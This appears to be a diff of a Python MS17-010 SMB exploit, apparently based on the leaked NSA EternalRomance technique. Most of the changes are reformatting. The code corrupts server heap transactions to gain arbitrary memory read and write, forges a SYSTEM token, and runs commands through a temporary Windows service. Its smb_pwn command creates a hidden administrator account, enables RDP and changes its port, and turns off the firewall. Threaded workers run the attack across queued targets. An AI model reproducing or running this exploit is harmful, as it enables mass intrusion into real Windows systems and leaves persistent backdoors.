+            mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])
         wait_for_request_processed(conn)
 
         # if the overwritten is correct, a modified transaction mid should be special_mid now.
         # a new transaction with special_mid should be error.
-        recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
+        recvPkt = conn.send_nt_trans(
+            5, mid=special_mid, param=trans_param, data='')
         if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
             logger.log.debug('success controlling one transaction')
             success = True
@@ -651,20 +709,21 @@ def exploit_fish_barrel(conn, pipe_name, info):
                 info.update(OS_ARCH_INFO[info['os']][info['arch']])
             break
         if recvPkt.getNTStatus() != 0:
-            logger.log.debug('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
-    
+            logger.log.debug(
+                'unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+
     if not success:
-        logger.log.debug('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+        logger.log.debug(
+            'unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
         logger.log.debug('!!! Write to wrong place !!!')
         logger.log.info('the target might be crashed')
         return False
 
-
     # NSA eternalromance modify transaction RefCount to keep controlled and reuse transaction after leaking info.
     # This is easy to to but the modified transaction will never be freed. The next exploit attempt might be harder
     #   because of this unfreed memory chunk. I will avoid it.
-    
-    # From a picture above, now we can only control trans2 by trans1 data. Also we know only offset of these two 
+
+    # From a picture above, now we can only control trans2 by trans1 data. Also we know only offset of these two
     # transactions (do not know the address).
     # After reading memory by modifying and completing trans2, trans2 cannot be used anymore.
     # To be able to use trans1 after trans2 is gone, we need to modify trans1 to be able to modify itself.
@@ -673,24 +732,32 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # On 64 bit target, modifying paramter count is not enough because address size is 64 bit. Because our transactions
     #   are allocated with RtlAllocateHeap(), the HIDWORD of InParameter is always 0. To be able to write backward with offset only,
     #   we also modify HIDWORD of InParameter to 0xffffffff.
-    
-    logger.log.debug('modify parameter count to 0xffffffff to be able to write backward')
-    conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
+
+    logger.log.debug(
+        'modify parameter count to 0xffffffff to be able to write backward')
+    conn.send_trans_secondary(
+        mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
     # on 64 bit, modify InParameter last 4 bytes to \xff\xff\xff\xff too
     if info['arch'] == 'x64':
-        conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
+        conn.send_trans_secondary(
+            mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
     wait_for_request_processed(conn)
-    
-    TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE
-    PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN
+
+    TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + \
+        info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE
+    PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + \
+        info['TRANS_SIZE'] + TRANS_NAME_LEN
     PREV_TRANS_OFFSET = 0x100000000 - PREV_TRANS_DISPLACEMENT
 
     # modify paramterCount of first transaction
-    conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
+    conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4,
+                                 paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
     if info['arch'] == 'x64':
-        conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
+        conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4,
+                                     paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
         # restore trans2.InParameters pointer before leaking next transaction
-        conn.send_trans_secondary(mid=info['fid'], data='\x00'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
+        conn.send_trans_secondary(
+            mid=info['fid'], data='\x00'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
     wait_for_request_processed(conn)
 
     # ================================
@@ -699,9 +766,11 @@ def exploit_fish_barrel(conn, pipe_name, info):
     logger.log.debug('leak next transaction')
     # modify TRANSACTION member to leak info
     # function=5 (NT_TRANS_RENAME)
-    conn.send_trans_secondary(mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_FUNCTION_OFFSET'])
+    conn.send_trans_secondary(
+        mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_FUNCTION_OFFSET'])
     # parameterCount, totalParameterCount, maxParameterCount, dataCount, totalDataCount
-    conn.send_trans_secondary(mid=info['fid'], data=pack('<IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])
+    conn.send_trans_secondary(mid=info['fid'], data=pack(
+        '<IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])
 
     conn.send_nt_trans_secondary(mid=special_mid)
     leakData = conn.recv_transaction_data(special_mid, 0x100)
@@ -717,21 +786,23 @@ def exploit_fish_barrel(conn, pipe_name, info):
     leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
     leakTrans = leakData[leakTranOffset:]
     fmt = info['PTR_FMT']
-    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+fmt*5, leakTrans, 8)
-    inparam_value, outparam_value, indata_value = unpack_from('<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
+    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from(
+        '<'+fmt*5, leakTrans, 8)
+    inparam_value, outparam_value, indata_value = unpack_from(
+        '<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
     trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
-    
+
     logger.log.debug('CONNECTION: 0x{:x}'.format(connection_addr))
     logger.log.debug('SESSION: 0x{:x}'.format(session_addr))
     logger.log.debug('FLINK: 0x{:x}'.format(flink_value))
     logger.log.debug('InData: 0x{:x}'.format(indata_value))
     logger.log.debug('MID: 0x{:x}'.format(trans2_mid))
-    
+
     trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
     trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
     logger.log.debug('TRANS1: 0x{:x}'.format(trans1_addr))
     logger.log.debug('TRANS2: 0x{:x}'.format(trans2_addr))
-    
+
     # ================================
     # modify trans struct to be used for arbitrary read/write
     # ================================
@@ -741,14 +812,16 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # - trans1.InData to &trans2. so we can modify trans2 with trans1 data
     # Note: HIDWORD of trans1.InParameter is still 0xffffffff
     TRANS_OFFSET = 0x100000000 - (info['TRANS_SIZE'] + TRANS_NAME_LEN)
-    conn.send_nt_trans_secondary(mid=info['fid'], param=pack('<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])
+    conn.send_nt_trans_secondary(mid=info['fid'], param=pack(
+        '<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])
     wait_for_request_processed(conn)
-    
+
     # modify trans1.mid
     trans1_mid = conn.next_mid()
-    conn.send_trans_secondary(mid=info['fid'], param=pack('<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
+    conn.send_trans_secondary(mid=info['fid'], param=pack(
+        '<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
     wait_for_request_processed(conn)
-    
+
     info.update({
         'connection': connection_addr,
         'session': session_addr,
@@ -759,40 +832,43 @@ def exploit_fish_barrel(conn, pipe_name, info):
     })
     return True
 
+
 def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
     SID_SYSTEM = pack('<BB5xB'+'I', 1, 1, 5, 18)
     SID_ADMINISTRATORS = pack('<BB5xB'+'II', 1, 2, 5, 32, 544)
     SID_AUTHENICATED_USERS = pack('<BB5xB'+'I', 1, 1, 5, 11)
     SID_EVERYONE = pack('<BB5xB'+'I', 1, 1, 1, 0)
     # SID_SYSTEM and SID_ADMINISTRATORS must be added
-    sids = [ SID_SYSTEM, SID_ADMINISTRATORS, SID_EVERYONE, SID_AUTHENICATED_USERS ]
+    sids = [SID_SYSTEM, SID_ADMINISTRATORS,
+            SID_EVERYONE, SID_AUTHENICATED_USERS]
     # - user has no attribute (0)
     # - 0xe: SE_GROUP_OWNER | SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT
     # - 0x7: SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY
-    attrs = [ 0, 0xe, 7, 7 ]
-    
+    attrs = [0, 0xe, 7, 7]
+
     # assume its space is enough for SID_SYSTEM and SID_ADMINISTRATORS (no check)
     # fake user and groups will be in same buffer of original one
     # so fake sids size must NOT be bigger than the original sids
     fakeUserAndGroupCount = min(userAndGroupCount, 4)
     fakeUserAndGroupsAddr = userAndGroupsAddr
-    
-    addr = fakeUserAndGroupsAddr + (fakeUserAndGroupCount * info['PTR_SIZE'] * 2)
+
+    addr = fakeUserAndGroupsAddr + \
+        (fakeUserAndGroupCount * info['PTR_SIZE'] * 2)
     fakeUserAndGroups = ''
     for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
         fakeUserAndGroups += pack('<'+info['PTR_FMT']*2, addr, attr)
         addr += len(sid)
     fakeUserAndGroups += ''.join(sids[:fakeUserAndGroupCount])
-    
+
     return fakeUserAndGroupCount, fakeUserAndGroups
 
 
-def exploit(target, user, pwd, pipe_name = None):
+def exploit(target, user, pwd, pipe_name=None):
     addrOK = '0'
     try:
         conn = MYSMB(target)
-    except Exception,ex:
-        logger.log.info("exploit error! ERROR:%s"%str(ex))
+    except Exception, ex:
+        logger.log.info("exploit error! ERROR:%s" % str(ex))
         return addrOK
     # set NODELAY to make exploit much faster
     conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -827,10 +903,11 @@ def exploit(target, user, pwd, pipe_name = None):
         info['arch'] = 'x86'
         info['method'] = exploit_fish_barrel
     else:
-        logger.log.debug('This exploit does not support this target %s'%target)
-        #sys.exit()
+        logger.log.debug(
+            'This exploit does not support this target %s' % target)
+        # sys.exit()
         return addrOK
-    
+
     if pipe_name is None:
         pipe_name = find_named_pipe(conn)
         if pipe_name is None:
@@ -844,44 +921,51 @@ def exploit(target, user, pwd, pipe_name = None):
     # Now, read_data() and write_data() can be used for arbitrary read and write.
     # ================================
     # Modify this SMB session to be SYSTEM
-    # ================================  
+    # ================================
     fmt = info['PTR_FMT']
-    
+
     logger.log.debug('make this SMB session to be SYSTEM')
     # IsNullSession = 0, IsAdmin = 1
-    write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')
+    write_data(conn, info, info['session'] +
+               info['SESSION_ISNULL_OFFSET'], '\x00\x01')
 
     # read session struct to get SecurityContext address
     sessionData = read_data(conn, info, info['session'], 0x100)
-    secCtxAddr = unpack_from('<'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]
+    secCtxAddr = unpack_from('<'+fmt, sessionData,
+                             info['SESSION_SECCTX_OFFSET'])[0]
 
     if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
         # Windows 2003 and earlier uses only ImpersonateSecurityContext() (with PCtxtHandle struct) for impersonation
         # Modifying token seems to be difficult. But writing kernel shellcode for all old Windows versions is
         # much more difficult because data offset in ETHREAD/EPROCESS is different between service pack.
-        
+
         # find the token and modify it
         if 'SECCTX_PCTXTHANDLE_OFFSET' in info:
-            pctxtDataInfo = read_data(conn, info, secCtxAddr+info['SECCTX_PCTXTHANDLE_OFFSET'], 8)
+            pctxtDataInfo = read_data(
+                conn, info, secCtxAddr+info['SECCTX_PCTXTHANDLE_OFFSET'], 8)
             pctxtDataAddr = unpack_from('<'+fmt, pctxtDataInfo)[0]
         else:
             pctxtDataAddr = secCtxAddr
 
-        tokenAddrInfo = read_data(conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
+        tokenAddrInfo = read_data(
+            conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
         tokenAddr = unpack_from('<'+fmt, tokenAddrInfo)[0]
         logger.log.debug('current TOKEN addr: 0x{:x}'.format(tokenAddr))
-        
+
         # copy Token data for restoration
         tokenData = read_data(conn, info, tokenAddr, 0x40*info['PTR_SIZE'])
-        
+
         # parse necessary data out of token
-        userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset = get_group_data_from_token(info, tokenData)
+        userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset = get_group_data_from_token(
+            info, tokenData)
 
         logger.log.debug('overwriting token UserAndGroups')
         # modify UserAndGroups info
-        fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr)
+        fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(
+            conn, info, userAndGroupCount, userAndGroupsAddr)
         if fakeUserAndGroupCount != userAndGroupCount:
-            write_data(conn, info, tokenAddr+userAndGroupCountOffset, pack('<I', fakeUserAndGroupCount))
+            write_data(conn, info, tokenAddr+userAndGroupCountOffset,
+                       pack('<I', fakeUserAndGroupCount))
         write_data(conn, info, userAndGroupsAddr, fakeUserAndGroups)
     else:
         # the target can use PsImperonateClient for impersonation (Windows 2008 and later)
@@ -894,7 +978,7 @@ def exploit(target, user, pwd, pipe_name = None):
 
     # ================================
     # do whatever we want as SYSTEM over this SMB connection
-    # ================================  
+    # ================================
     try:
         smb_pwn(conn, info['arch'])
         addrOK = target
@@ -904,9 +988,11 @@ def exploit(target, user, pwd, pipe_name = None):
     # restore SecurityContext/Token
     if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
         userAndGroupsOffset = userAndGroupsAddr - tokenAddr
-        write_data(conn, info, userAndGroupsAddr, tokenData[userAndGroupsOffset:userAndGroupsOffset+len(fakeUserAndGroups)])
+        write_data(conn, info, userAndGroupsAddr,
+                   tokenData[userAndGroupsOffset:userAndGroupsOffset+len(fakeUserAndGroups)])
         if fakeUserAndGroupCount != userAndGroupCount:
-            write_data(conn, info, tokenAddr+userAndGroupCountOffset, pack('<I', userAndGroupCount))
+            write_data(conn, info, tokenAddr+userAndGroupCountOffset,
+                       pack('<I', userAndGroupCount))
     else:
         write_data(conn, info, secCtxAddr, secCtxData)
 
@@ -914,6 +1000,7 @@ def exploit(target, user, pwd, pipe_name = None):
     conn.logoff()
     conn.get_socket().close()
     return addrOK
+
 
 def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset):
     # struct _TOKEN:
@@ -925,8 +1012,10 @@ def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroup
     #   PSID_AND_ATTRIBUTES RestrictedSids;                 // Ro: sizeof(void*)
     #   ...
 
-    userAndGroupCount, RestrictedSidCount = unpack_from('<II', tokenData, userAndGroupCountOffset) 
-    userAndGroupsAddr, RestrictedSids = unpack_from('<'+info['PTR_FMT']*2, tokenData, userAndGroupsAddrOffset)
+    userAndGroupCount, RestrictedSidCount = unpack_from(
+        '<II', tokenData, userAndGroupCountOffset)
+    userAndGroupsAddr, RestrictedSids = unpack_from(
+        '<'+info['PTR_FMT']*2, tokenData, userAndGroupsAddrOffset)
 
     # RestrictedSidCount    MUST be 0
     # RestrictedSids    MUST be NULL
@@ -939,34 +1028,40 @@ def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroup
     success = True
 
     if RestrictedSidCount != 0 or RestrictedSids != 0 or userAndGroupCount == 0 or userAndGroupsAddr == 0:
-        logger.log.debug('Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
+        logger.log.debug(
+            'Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
         logger.log.debug('RestrictedSids: 0x{:x}'.format(RestrictedSids))
-        logger.log.debug('RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))
+        logger.log.debug(
+            'RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))
         success = False
 
     logger.log.debug('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
     logger.log.debug('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))
 
-    return success, userAndGroupCount, userAndGroupsAddr 
+    return success, userAndGroupCount, userAndGroupsAddr
+
 
 def get_group_data_from_token(info, tokenData):
     userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET']
     userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET']
 
     # try with default offsets
-    success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)
+    success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(
+        info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)
 
     # hack to fix XP SP0 and SP1
-    # I will avoid over-engineering a more elegant solution and leave this as a hack, 
+    # I will avoid over-engineering a more elegant solution and leave this as a hack,
     # since XP SP0 and SP1 is the only edge case in a LOT of testing!
     if not success and info['os'] == 'WINXP' and info['arch'] == 'x86':
-        logger.log.debug('Attempting WINXP SP0/SP1 x86 TOKEN_USER_GROUP workaround')
+        logger.log.debug(
+            'Attempting WINXP SP0/SP1 x86 TOKEN_USER_GROUP workaround')
 
         userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1']
         userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1']
 
         # try with hack offsets
-        success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)
+        success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(
+            info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)
 
     # still no good. Abort because something is wrong
     if not success:
@@ -976,22 +1071,25 @@ def get_group_data_from_token(info, tokenData):
     # token parsed and validated
     return userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset
 
+
 def smb_pwn(conn, arch):
     smbConn = conn.get_smbconnection()
-    
+
     #logger.log.info('exec net user admin$ admin$12345 /add && net localgroup administrators admin$ /add')
     #tid2 = smbConn.connectTree('C$')
     #fid2 = smbConn.createFile(tid2, '/ms17010.txt')
     #smbConn.closeFile(tid2, fid2)
-    #smbConn.disconnectTree(tid2)
+    # smbConn.disconnectTree(tid2)
     #logger.log.info('sending file...')
     #smb_send_file(smbConn, 'cmd.bat', 'C', '/cmd.bat')
-    
-    logger.log.info('exec net user admin$ admin$12345 /add && net localgroup administrators admin$ /add')
-    service_exec(conn, r'cmd /c net user admin$ admin$12345 /add && net localgroup administrators admin$ /add')
+
+    logger.log.info(
+        'create admin$/admin$12345,open 3389 RDP,add connection number,shutdown firewall,reg hidden')
+    service_exec(conn, r'cmd /c net user admin$ admin$12345 /add && net localgroup administrators admin$ /add && REG ADD "HKLM\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f && REG ADD "SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f && REG ADD "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v admin$ /t REG_DWORD /d 0x00000000 /f && NetSh Advfirewall set allprofiles state off')
     # Note: there are many methods to get shell over SMB admin session
     # a simple method to get shell (but easily to be detected by AV) is
     # executing binary generated by "msfvenom -f exe-service ..."
+
 
 def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
     with open(localSrc, 'rb') as fp:
@@ -999,11 +1097,13 @@ def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
 
 # based on impacket/examples/serviceinstall.py
 # Note: using Windows Service to execute command same as how psexec works
+
+
 def service_exec(conn, cmd):
     import random
     import string
     from impacket.dcerpc.v5 import transport, srvs, scmr
-    
+
     service_name = ''.join([random.choice(string.letters) for i in range(4)])
 
     # Setup up a DCE SMBTransport with the connection already in place
@@ -1012,10 +1112,11 @@ def service_exec(conn, cmd):
     rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
     svcHandle = None
     try:
-        logger.log.debug("Opening SVCManager on %s....." % conn.get_remote_host())
+        logger.log.debug("Opening SVCManager on %s....." %
+                         conn.get_remote_host())
         resp = scmr.hROpenSCManagerW(rpcsvc)
         svcHandle = resp['lpScHandle']
-        
+
         # First we try to open the service in case it exists. If it does, we remove it.
         try:
             resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+'\x00')
@@ -1026,28 +1127,29 @@ def service_exec(conn, cmd):
             # It exists, remove it
             scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
             scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
-        
+
         logger.log.debug('Creating service %s.....' % service_name)
-        resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
+        resp = scmr.hRCreateServiceW(
+            rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
         serviceHandle = resp['lpServiceHandle']
-        
+
         if serviceHandle:
             # Start service
             try:
                 logger.log.debug('Starting service %s.....' % service_name)
                 scmr.hRStartServiceW(rpcsvc, serviceHandle)
-                
+
                 # is it really need to stop?
                 # using command line always makes starting service fail because SetServiceStatus() does not get called
                 #logger.log.debug('Stoping service %s.....' % service_name)
                 #scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
             except Exception as e:
                 logger.log.debug(str(e))
-            
+
             logger.log.debug('Removing service %s.....' % service_name)
             scmr.hRDeleteService(rpcsvc, serviceHandle)
             scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
-            
+
     except Exception as e:
         logger.log.debug("ServiceExec Error on: %s" % conn.get_remote_host())
         logger.log.debug(str(e))
@@ -1057,6 +1159,7 @@ def service_exec(conn, cmd):
 
     rpcsvc.disconnect()
 
+
 '''
 if len(sys.argv) < 2:
     print("{} <ip> [pipe_name]".format(sys.argv[0]))
@@ -1065,42 +1168,47 @@ if len(sys.argv) < 2:
 target = sys.argv[1]
 pipe_name = None if len(sys.argv) < 3 else sys.argv[2]
 '''
-def exploitFromQueue(checkQueue,resultQueue,exploitResultDic):
-    #while not checkQueue.empty():
+
+
+def exploitFromQueue(checkQueue, resultQueue, exploitResultDic):
+    # while not checkQueue.empty():
     while True:
         try:
             try:
-                item = checkQueue.get(True,8)
-            except Exception,ex:
+                item = checkQueue.get(True, 8)
+            except Exception, ex:
                 break
             target = item['target']
             if(exploitResultDic.get(target)):
                 continue
             user = item['user']
             pwd = item['pwd']
-            logger.log.info('exploit attack target:%s user:%s pwd:%s'%(target,user,pwd))
-            result = exploit(target,user,pwd)
+            logger.log.info(
+                'exploit attack target:%s user:%s pwd:%s' % (target, user, pwd))
+            result = exploit(target, user, pwd)
             if(result != '0' and result != False):
-                item = {'addr':result,'user':user,'pwd':pwd}
+                item = {'addr': result, 'user': user, 'pwd': pwd}
                 exploitResultDic[str(target)] = item
-                resultQueue.put(item,True)
+                resultQueue.put(item, True)
             else:
-                logger.log.info('Failure::exploit attack target:%s user:%s pwd:%s'%(target,user,pwd))
-        except Exception,ex:
-            logger.log.warning("exploitFromQueue error! ERROR:%s"%str(ex))   
+                logger.log.info(
+                    'Failure::exploit attack target:%s user:%s pwd:%s' % (target, user, pwd))
+        except Exception, ex:
+            logger.log.warning("exploitFromQueue error! ERROR:%s" % str(ex))
 
-def exploitTh(checkQueue,resultQueue,count,exploitResultDic,thlist):
+
+def exploitTh(checkQueue, resultQueue, count, exploitResultDic, thlist):
     #thlist = []
     for i in range(count):
         try:
-            exploitrth = threading.Thread(target=exploitFromQueue,args=(checkQueue,resultQueue,exploitResultDic))
+            exploitrth = threading.Thread(target=exploitFromQueue, args=(
+                checkQueue, resultQueue, exploitResultDic))
             thlist.append(exploitrth)
             exploitrth.setDaemon(True)
             exploitrth.start()
-            logger.log.info("exploitrth:%d started!"%i)  
-            #checkerth.join()
-        except Exception,ex:
-            logger.log.warning("exploitrth error! ERROR:%s"%str(ex))  
+            logger.log.info("exploitrth:%d started!" % i)
+            # checkerth.join()
+        except Exception, ex:
+            logger.log.warning("exploitrth error! ERROR:%s" % str(ex))
 #exploit(target, pipe_name)
-#print('Done')
-
+# print('Done')
